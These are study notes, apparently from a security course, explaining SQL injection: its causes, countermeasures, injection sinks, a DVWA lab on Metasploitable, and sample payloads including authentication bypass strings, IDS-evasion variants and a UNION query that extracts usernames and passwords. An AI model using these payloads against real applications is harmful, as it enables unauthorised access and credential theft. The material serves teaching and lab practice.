# SQL Injection (SLQi)

> [!NOTE] SQL Injection
> **SQL injection** refers to inputting raw SQL queries into an application to perform an unexpected action.
- We have a SQLi when it is possible to modify the syntax of the query by altering the application input
- SQLi causes
	-  missing input validation 
	- application-generated queries contains user-fed input

## SQLi countermeasures
- Programmers must take care of input sanitization 
- Programmers often rely on “automagic” methods (e.g., in PHP, magic_quotes_gpc escapes calling addslashes() ) 
- How to sanitize strongly depends on which kind of attack we want to prevent 
- Avoid manually crafted regexps 
- Best practice: use mysql_real_escape_string() 
- If a number is expected, check that the input really is a number 
- Prepared statements 
- Parametrized query (if the language supports it)

## SQLi sinks (where to inject our SQL code)
- **User Input** 
	- GET/POST parameters 
	- many client-side technologies communicate with the server through GET/POST (e.g., Flash, applet Java, AJAX)
- **HTTP Headers**
	- every HTTP header must be treated as dangerous
	- User-Agent, Referer, . . . can be maliciously altered
- **Other SQLi sinks**
	- **Cookies** 
		- after all, they are just headers . . . 
		-  . . . and they come from the client ⇒ dangerous
	- **The database itself: second order injection**
		- the input of the application is stored in the database later, the same input may be fetched from the database and used to build another query ⇒ dangerous

## Let’s try SQL Injection in Metasploitable
- Change DVWA Security to low
- ![[Pasted image 20240608174531.png]]
- ![[Pasted image 20240608174544.png]]
- Try submitting different input
- Try to insert ’ OR ’1’=’1
![[Pasted image 20240608174613.png]]

## SQLi examples
##### 1. Query
```
$q = ”SELECT id FROM users WHERE user=’”.$user.”’ AND pass=’”.$pass.”’”;
```

##### 2. sent parameters
```
$user = ”admin”;
$pass = ”’ OR ’1’=’1”;
```

##### 3. query that is really executed
```
$q = ”SELECT id FROM users WHERE user=’admin’ AND pass=’’ OR ’1’=’1’”;
```
##### 3.5 If the input were sanitized (e.g., *mysql_escape_string()*)
```
$q = ”SELECT id FROM users WHERE user=’admin’ AND pass=’\’ OR \’\’=\’’”;
```

### SQLi other examples
##### 1. choosing “blindly” the first available user
```
$pass = ”’ OR 1=1 # ”; 
$q = ”SELECT id FROM users WHERE user=’’ AND pass=’’ OR 1=1 # ’”; 
$user = ”’ OR user LIKE ’%’ #”; 
$q = ”SELECT id FROM users WHERE user=’’ OR user LIKE ’%’ #’ AND pass=’’”; 
$user = ”’ OR 1 # ”; 
$q = ”SELECT id FROM users WHERE user=’’ OR 1 #’ AND pass=’’”;
```
##### 2. choosing a known user
```
$user = ”admin’ OR 1 # ”; 
$q = ”SELECT id FROM users WHERE user=’admin’ OR 1 #’ AND pass=’’”; 
$user = ”admin’ #”; 
$q = ”SELECT id FROM users WHERE user=’admin’ #’ AND pass=’’”;
```
##### 3. IDS evasion
```
$pass = ”’ OR 5>4 OR password=’mypass”; 
$pass = ”’ OR ’vulnerability’>’server”;
```

### SQLi UNION query
- **query**
```
$q = ”SELECT id, name, price, description FROM products WHERE category=”.$_GET[’cat’];
```
- **injected code**
```
$cat=”1 UNION SELECT 1, user, 1, pass FROM users”;
```
- The **number** and **types** of the columns returned by the two SELECT must match 
	- MySQL: if **types** do not match, a cast is performed automatically
